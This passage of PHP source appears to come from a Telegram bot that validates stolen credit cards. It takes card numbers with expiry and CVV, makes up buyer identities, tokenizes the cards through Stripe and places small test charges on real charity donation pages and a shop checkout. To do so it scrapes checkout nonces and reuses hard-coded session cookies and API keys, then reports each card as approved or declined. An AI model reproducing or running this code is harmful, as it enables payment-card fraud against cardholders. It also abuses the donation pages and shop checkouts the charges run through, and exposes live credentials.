3MUtPMkc4ZDB4Vk1ZS1lWbi81bTZNemNwaTVDMVV6c2ZsMytQbmF5dGR5VXkxbkVsdXJVcHMwYkhJbnMxZ0tVRzhscER5ZCthT204cFdxVjdWRVBNRCt6YldSRkxkQjFVYXpiVWEvMnJhcndvM2lYamRnbThhNThkc0V0RWFPNTk5U3pQZDZEaXRzTlZkM25kcXBidTJ1ZVJlczY1SVhXK1cxUXovZjcifQ.oRAkXNy3jstOMy0hGz7Bm9lXwT7H9KOSp-u7V_pfy5A',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'accept-language: es-US,es;q=0.9',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);

echo "$id\n";


$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://facesandvoicesofrecovery.org?wc-ajax=checkout',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F&wc_order_attribution_session_start_time=2024-11-14+02%3A29%3A54&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F130.0.0.0+Mobile+Safari%2F537.36&billing_email='.$email.'&billing_first_name='.$name.'&billing_last_name='.$last.'&billing_company=&billing_country=US&billing_address_1='.$street.'&billing_address_2=&billing_city='.$city.'&billing_state='.$state.'&billing_postcode='.$postcode.'&billing_phone='.$phone.'&fvr_wc_donation_in_honor_of=&order_comments=&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&wc-stripe-new-payment-method=true&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method='.$id.'',
  CURLOPT_COOKIE => 'wordpress_logged_in_508923f30af7c37ea20c1d6887bb80bd=carlos.perez%7C1731729744%7Cp7KAvNle7Z1J9WwkLyQ4PTMeq1zNEmuc8436DoPO1Gc%7C358a3a02a21c66e436aeb6c84464c7c513b7cb769cf0952f36dd1cb596190913; wfwaf-authcookie-084fa67f8cdb5120d8f1ead9606207d0=19092%7Cother%7Cread%7Cd3fc84ddf757273bc068194acf1e986b13cb094ebcc3ce59dbd6f46031f024ea; woocommerce_items_in_cart=1; woocommerce_cart_hash=c73fc674d47101bf3c9ebdaef484e9dc; wp_woocommerce_session_508923f30af7c37ea20c1d6887bb80bd=19092%7C%7C1731724262%7C%7C1731720662%7C%7Ce40ce29008ab8337ffd6a94f35e07914; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-14%2002%3A29%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-14%2002%3A29%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=e8398605-f154-4877-b187-a7cee3a338b74c2226; __stripe_sid=8fbaf3a4-34e1-4d60-8833-357ce1408ef8e06a35; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fengage%2Fdonate%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'x-requested-with: XMLHttpRequest',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'accept-language: es-US,es;q=0.9',
    'origin: https://facesandvoicesofrecovery.org',
    'referer: https://facesandvoicesofrecovery.org/engage/donate/',
  ],
]);
	
$response = curl_exec($curl);
$err = curl_error($curl);
//echo "$response\n";
$json = json_decode($response, true);
$respo = trim(strip_tags($json['messages']));
$partes = explode(':', $respo);
$respo = trim($partes[1]);
curl_close($curl);
sendPv($myid, response);
	
$result = $json['result'];
if ($result == "success"){
$respo = "Charged $10";
}
	
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

if (empty($respo)) {
        $respo = $response;
}

if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe ($10)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe ($10)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe ($10)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    editMessage($chat_id, $respuesta, $id_text);
} else {
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}



elseif((strpos($message, "!go") === 0)||(strpos($message, "/go") === 0)||(strpos($message, ".go") === 0)){            
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = trim($i[0]);
$mes   = trim($i[1]);
$ano  = trim(substr($i[2], -2));
$cvv   = trim($i[3]);

$bin = substr($lista, 0, 6);
$ma = "$mes/$ano1";
//$ma = "$mes+%2F+$ano";

////
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /go cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !go cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .go cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin



//RANDOM USER//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];

////SACA EL TOKEN//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&time_on_page=63244&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb&pasted_fields=number');
$response = curl_exec($ch);
$err = curl_error($ch);
$json = json_decode($response, true);
curl_close($ch);
/*
$token = trim(strip_tags(getstr($result,'id": "','"')));
$ip = trim(strip_tags(getstr($result,'client_ip": "','"')));
*/
$token = $json["id"];
$ip = $json["client_ip"];

//---------------PRUEBA LAS CCS EN PAGINA DE DONACION---------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://goodbricksapp.com/icsd.org/donate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'g-recaptcha-response=03ANYolqtrAXy5zIt2AjPl_v86EhHB_0O8YEgRQ73dmNp0E6rS3OaDFJqwYHwDoSLyD6Z9plsGVb3XvVAqEvqVWJTNX-YDYXAx2ynIggYNEIE5ns3byzDEIOJMghcj6qkmnzTyM4nzk3XRnSeqndz8VbvON0ctHxIbblzlqdtAwfNLKyYN3Z4QvcOqK8RmrhIJNInTgDRBAXqo8cCS3hg2xlDTbuzXSS1EV4WAlTE0yIyUVAs27f63DSS4MRZL-jX8ifTCcHmDgX3sKX92atN3k3vI91QTJ8TGmPkcuWTj4xgBnktDyFxQSIPMY2yORw5d90yIDfUHQV62ZAn3TQvZ0l_psLuVhs15xrah2ZGuA-qTBuAhAM64qn8WXaw2YCXQMG1rU4RkUeYm3PvsV0_Yxq9aBzDMC7g6aySQP-1RUw2AA6Ma7yTWvhdwL7tWcs7iy6-5fWF86dIb2tBujmSMzwfr4EdOZ1PD4Q&token='.$token.'&clientIp='.$ip.'&categoryAmount=5&paymentIterations=0&categoryName=funeral+expenses&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&address=true&addressStreet='.$street.'&addressApt=&addressCity='.$city.'&addressState='.$state.'&addressZipCode='.$postcode.'');

$response = curl_exec($ch);
$err = curl_error($ch);
$json = json_decode($response, true);
$respo = explode(';', $json['message'])[0];
curl_close($ch);
	

$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = $response;
}

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($5)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($5)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($5)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


 }

	

elseif((strpos($message, "!na") === 0)||(strpos($message, "/na") === 0)||(strpos($message, ".na") === 0)){
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano   = $i[2];
//$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];

if (strlen($ano) == 2) {
    $ano = '20' . $ano;
}


$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
	if($verify != ""){
		$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
		sendMessage($chat_id,$respuesta, $message_id);
		die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /na cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !na cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .na cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
        die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
        sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin



///SACA EL NONCE//
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.naturexnauts.com/checkout/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; shop_display=grid; wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; woocommerce_items_in_cart=1; woocommerce_cart_hash=6dcb71c95f2361b301b216aec27ec3d0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'referer: https://www.naturexnauts.com/checkout/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/name="woocommerce-process-checkout-nonce" value="([a-zA-Z0-9]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];
curl_close($curl);


if (empty($nonce)) {
//    echo "Se agrega un producto al carrito\n";
////Agrega el producto al carrito///
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.naturexnauts.com/product/mc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => [
    'quantity' => '1',
    'add-to-cart' => '125136',
  ],
  CURLOPT_COOKIE => 'wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2023%3A54%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fproduct%2Fmc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fproduct%2Fmc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc%2F; sbjs_first_add=fd%3D2024-11-03%2023%3A54%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fproduct%2Fmc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fproduct%2Fmc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fproduct%2Fmc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc%2F; shop_display=grid',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'origin: https://www.naturexnauts.com',
//    'content-type: multipart/form-data; boundary=----WebKitFormBoundarysB6JgnsfL19hB00B',
    'referer: https://www.naturexnauts.com/product/mc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/&ldquo;.*&rdquo;\s*(.*)/';
preg_match($patron, $response, $coincidencias);
$texto_necesario = trim($coincidencias[1]);
curl_close($curl);
//echo "$texto_necesario\n"; // Salida: has been added to your cart


////SACA EL NONCE///
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.naturexnauts.com/checkout/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; 